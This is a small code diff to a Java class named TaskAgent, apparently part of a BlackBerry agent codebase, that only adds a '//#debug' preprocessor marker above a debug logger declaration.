@@ -4,6 +4,7 @@ import com.ht.rcs.blackberry.utils.Debug;
 import com.ht.rcs.blackberry.utils.DebugLevel;
 
 public class TaskAgent extends Agent {
+	//#debug
     static Debug debug = new Debug("TaskAgent", DebugLevel.VERBOSE);
 
     public TaskAgent(boolean agentStatus) {
